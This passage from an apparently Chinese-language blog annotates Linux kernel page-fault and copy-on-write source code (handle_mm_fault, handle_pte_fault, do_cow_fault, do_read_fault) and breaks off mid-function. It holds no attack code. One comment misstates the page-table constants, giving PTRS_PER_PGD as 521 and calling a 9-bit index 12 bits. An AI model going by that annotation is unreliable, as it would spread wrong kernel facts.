(ret &amp; VM_FAULT_OOM)<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>		<span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))<br>			<span class="hljs-keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;<br>		<span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))<br>			<span class="hljs-keyword">return</span> -EFAULT;<br>		BUG();<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (tsk) &#123;<br>		<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_MAJOR)<br>			tsk-&gt;maj_flt++;<br>		<span class="hljs-keyword">else</span><br>			tsk-&gt;min_flt++;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;<br>		<span class="hljs-keyword">if</span> (nonblocking)<br>			*nonblocking = <span class="hljs-number">0</span>;<br>		<span class="hljs-keyword">return</span> -EBUSY;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment">	 * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment">	 * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment">	 * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment">	 * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment">	 * reCOWed by userspace write).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>		*flags &amp;= ~FOLL_WRITE;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a>handle_mm_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __handle_mm_fault(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,<br>			     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br>	<span class="hljs-type">pgd_t</span> *pgd;<br>	<span class="hljs-type">pud_t</span> *pud;<br>	<span class="hljs-type">pmd_t</span> *pmd;<br>	<span class="hljs-type">pte_t</span> *pte;<br><br>	<span class="hljs-keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))<br>		<span class="hljs-keyword">return</span> hugetlb_fault(mm, vma, address, flags);<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	   #define pgd_offset(mm, address)	((mm)-&gt;pgd+pgd_index(address))</span><br><span class="hljs-comment">	   mm-&gt;pgd即pgd的基地址</span><br><span class="hljs-comment">	   address即需要访问的线性地址</span><br><span class="hljs-comment">	   #define pgd_index(address)	(((address) &gt;&gt; PGDIR_SHIFT) &amp; (PTRS_PER_PGD-1))</span><br><span class="hljs-comment">	   #define PGDIR_SHIFT	39</span><br><span class="hljs-comment">	   #define PAGE_SHIFT	12</span><br><span class="hljs-comment">	   #define PTRS_PER_PGD 521</span><br><span class="hljs-comment">	   经过宏替换后 pdg_index(address) = (((address) &gt;&gt; 39) &amp; 0x1ff )</span><br><span class="hljs-comment">	   address的39-48比特为pgd_index,即高12比特</span><br><span class="hljs-comment">	*/</span><br>	pgd = pgd_offset(mm, address); 	 <br>	pud = pud_alloc(mm, pgd, address);<br>	<span class="hljs-keyword">if</span> (!pud)<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	pmd = pmd_alloc(mm, pud, address);<br>	<span class="hljs-keyword">if</span> (!pmd)<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	<span class="hljs-keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;<br>		<span class="hljs-type">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);<br>		<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-type">pmd_t</span> orig_pmd = *pmd;<br>		<span class="hljs-type">int</span> ret;<br><br>		barrier();<br>		<span class="hljs-keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;<br><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * If the pmd is splitting, return and retry the</span><br><span class="hljs-comment">			 * the fault.  Alternative: wait until the split</span><br><span class="hljs-comment">			 * is done, and goto retry.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">if</span> (pmd_trans_splitting(orig_pmd))<br>				<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>			<span class="hljs-keyword">if</span> (pmd_protnone(orig_pmd))<br>				<span class="hljs-keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,<br>							     orig_pmd, pmd);<br><br>			<span class="hljs-keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123; <span class="hljs-comment">//若存在write标志则标记为dirty</span><br>				ret = wp_huge_pmd(mm, vma, address, pmd,<br>							orig_pmd, flags);<br>				<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br>					<span class="hljs-keyword">return</span> ret;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				huge_pmd_set_accessed(mm, vma, address, pmd,<br>						      orig_pmd, dirty);<br>				<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span><br><span class="hljs-comment">	 * run pte_offset_map on the pmd, if an huge pmd could</span><br><span class="hljs-comment">	 * materialize from under us from a different thread.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;<br>	    unlikely(__pte_alloc(mm, vma, pmd, address)))<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	<span class="hljs-comment">/* if an huge pmd materialized from under us just retry later */</span><br>	<span class="hljs-keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * A regular pmd is established and it can&#x27;t morph into a huge pmd</span><br><span class="hljs-comment">	 * from under us anymore at this point because we hold the mmap_sem</span><br><span class="hljs-comment">	 * read mode and khugepaged takes it in write mode. So now it&#x27;s</span><br><span class="hljs-comment">	 * safe to run pte_offset_map().</span><br><span class="hljs-comment">	 */</span><br>	pte = pte_offset_map(pmd, address); <span class="hljs-comment">//找到pte项的偏移</span><br><br>	<span class="hljs-keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params">		     <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,</span><br><span class="hljs-params">		     <span class="hljs-type">pte_t</span> *pte, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-type">pte_t</span> entry;<br>	<span class="hljs-type">spinlock_t</span> *ptl;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * some architectures can have larger ptes than wordsize,</span><br><span class="hljs-comment">	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span><br><span class="hljs-comment">	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span><br><span class="hljs-comment">	 * The code below just needs a consistent view for the ifs and</span><br><span class="hljs-comment">	 * we later double check anyway with the ptl lock held. So here</span><br><span class="hljs-comment">	 * a barrier will do.</span><br><span class="hljs-comment">	 */</span><br>	entry = *pte;<br>	barrier();<br>	<span class="hljs-keyword">if</span> (!pte_present(entry)) &#123;<br>		<span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<br>			<span class="hljs-keyword">if</span> (vma_is_anonymous(vma)) <span class="hljs-comment">//include/linux/mm.h:1287 </span><br>				<span class="hljs-comment">//处理匿名文件映射的缺页</span><br>				<span class="hljs-keyword">return</span> do_anonymous_page(mm, vma, address,<br>							 pte, pmd, flags);<br>			<span class="hljs-keyword">else</span><br>				<span class="hljs-comment">//处理文件映射的缺页</span><br>				<span class="hljs-keyword">return</span> do_fault(mm, vma, address, pte, pmd,<br>						flags, entry);<br>		&#125;<br>		<span class="hljs-comment">//页表存在，但不存在于物理内存之中，从磁盘交换区换入物理内存</span><br>		<span class="hljs-keyword">return</span> do_swap_page(mm, vma, address,<br>					pte, pmd, flags, entry);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (pte_protnone(entry))<br>		<span class="hljs-keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);<br><br>	ptl = pte_lockptr(mm, pmd);<br>	spin_lock(ptl);<br>	<span class="hljs-keyword">if</span> (unlikely(!pte_same(*pte, entry)))<br>		<span class="hljs-keyword">goto</span> unlock;<br>	<span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123; <span class="hljs-comment">//由于写导致的缺页处理</span><br>		<span class="hljs-keyword">if</span> (!pte_write(entry)) <span class="hljs-comment">//pte表项不能写</span><br>			<span class="hljs-keyword">return</span> do_wp_page(mm, vma, address,<br>					pte, pmd, ptl, entry); <span class="hljs-comment">//在这个函数里，kernel将会根据物理页遍历所有对应的虚拟页（使用链表）求map cnt，如果map cnt为1，说明当前物理页仅被一个进程使用，不需要COW。（这个过程加锁，防止cnt不同步）。这种情况下，则调用 wp_page_reuse 。参考https://zhuanlan.zhihu.com/p/70779813</span><br>		entry = pte_mkdirty(entry);<br>	&#125;<br>	entry = pte_mkyoung(entry);<br>	<span class="hljs-keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;<br>		update_mmu_cache(vma, address, pte);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * This is needed only for protection faults but the arch code</span><br><span class="hljs-comment">		 * is not yet telling us if this is a protection fault or not.</span><br><span class="hljs-comment">		 * This still avoids useless tlb flushes for .text page faults</span><br><span class="hljs-comment">		 * with threads.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)<br>			flush_tlb_fix_spurious_fault(vma, address);<br>	&#125;<br>unlock:<br>	pte_unmap_unlock(pte, ptl);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pte_t</span> *page_table, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>&#123;<br>	<span class="hljs-type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK) <span class="hljs-comment">//取页起始地址</span><br>			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;<br><br>	pte_unmap(page_table);<br>	<span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br>	<span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<br>		<span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br>	<span class="hljs-keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE)) <span class="hljs-comment">//若不需要写则调用do_read_fault函数，直接将原始页返回</span><br>		<span class="hljs-keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,<br>				orig_pte);<br>	<span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED)) <span class="hljs-comment">//若需要写，则使用写时复制，返回新的页</span><br>		<span class="hljs-keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,<br>				orig_pte);<br>	<span class="hljs-keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<span class="hljs-comment">//需要共享页时也将原始的页返回</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="do-cow-fault"><a href="#do-cow-fault" class="headerlink" title="do_cow_fault"></a>do_cow_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params">		<span class="hljs-type">pgoff_t</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *pte;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-comment">//分配和准备anon_vma</span><br>	<span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>	<span class="hljs-comment">//分配一个用户页面</span><br>	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);<br>	<span class="hljs-keyword">if</span> (!new_page)<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>	<span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;<br>		page_cache_release(new_page);<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	&#125;<br>	<span class="hljs-comment">//从根据new_page分配新的页给fault_page</span><br>	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">goto</span> uncharge_out;<br><br>	<span class="hljs-keyword">if</span> (fault_page)<br>		<span class="hljs-comment">//将fault_page里的值拷贝到new_page中</span><br>		copy_user_highpage(new_page, fault_page, address, vma);<br>	__SetPageUptodate(new_page);<br><br>	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>	<span class="hljs-keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;<br>		pte_unmap_unlock(pte, ptl);<br>		<span class="hljs-keyword">if</span> (fault_page) &#123;<br>			unlock_page(fault_page);<br>			page_cache_release(fault_page);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * The fault handler has no page to lock, so it holds</span><br><span class="hljs-comment">			 * i_mmap_lock for read to protect against truncate.</span><br><span class="hljs-comment">			 */</span><br>			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);<br>		&#125;<br>		<span class="hljs-keyword">goto</span> uncharge_out;<br>	&#125;<br>	<span class="hljs-comment">//将建立物理页与pte表的映射,此时完成虚拟地址与物理地址的映射</span><br>	do_set_pte(vma, address, new_page, pte, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>	mem_cgroup_commit_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br>	lru_cache_add_active_or_unevictable(new_page, vma);<br>	pte_unmap_unlock(pte, ptl);<br>	<span class="hljs-keyword">if</span> (fault_page) &#123;<br>		unlock_page(fault_page);<br>		page_cache_release(fault_page);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The fault handler has no page to lock, so it holds</span><br><span class="hljs-comment">		 * i_mmap_lock for read to protect against truncate.</span><br><span class="hljs-comment">		 */</span><br>		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);<br>	&#125;<br>	<span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br>	mem_cgroup_cancel_charge(new_page, memcg);<br>	page_cache_release(new_page);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault"></a>do_read_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_read_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params">		<span class="hljs-type">pgoff_t</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>;</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *pte;<br>	<span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span><br><span class="hljs-comment">	 * if page by the offset is not ready to be mapped (cold cache or</span><br><span class="hljs-comment">	 * something).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="hljs-number">1</span>) &#123;<br>		pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>		do_fault_around(vma, address, pte, pgoff, flags);<br>		<span class="hljs-keyword">if</span> (!pte_same(*pte, orig_pte))<br>			<span class="hljs-keyword">goto</span> unlock_out;<br>		pte_unmap_unlock(pte, ptl);<br>	&#125;<br><br>	ret = __do_fault(vma, address, pgoff, flags, <span class="hljs-literal">NULL</span>, &amp;fault_page);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">return</span> ret;<br><br>	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>	<span class="hljs-keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;<br>		pte_unmap_unlock(pte, ptl);<br>		unlock_page(fault_page);<br>		page_cache_release(fault_page);<br>		<span class="hljs-keyword">return</span> ret;<br>	&#125;<br>    <span class="hljs-comment">//将虚拟地址与fault_page进行映射</span><br>	do_set_pte(vma, address, fault_page, pte, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>	unlock_page(fault_page);<br>unlock_out:<br>	pte_unmap_unlock(pte, ptl);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="do-fault-1"><a href="#do-fault-1" class="headerlink" title="__do_fault"></a>__do_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __do_fault(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,<br>			<span class="hljs-type">pgoff_t</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,<br>			<span class="hljs-keyword">struct</span> page *cow_page, <span class="hljs-keyword">struct</span> page **page)<br>&#123;<br>	<span class="hljs-comment">//__do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page)</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_fault</span> <span class="hljs-title">vmf</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br>	vmf.virtual_address = (<span class="hljs-type">void</span> __user *)(address &amp; PAGE_MASK);<br>	vmf.pgoff = pgoff;<br>	vmf.flags = flags;<br>	vmf.page = <span class="hljs-literal">NULL</span>;<br>	vmf.cow_page = cow_page;<br><br>	ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);<span class="hljs-comment">//使用指定的错误处理的函数</span><br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">return</span> ret;<br>	<span class="hljs-keyword">if</span> (!vmf.page)<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">if</span> (unlikely(PageHWPoison(vmf.page))) &#123;<br>		<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_LOCKED)<br>			unlock_page(vmf.page);<br>		page_cache_release(vmf.page);<br>		<span class="hljs-keyword">return</span> 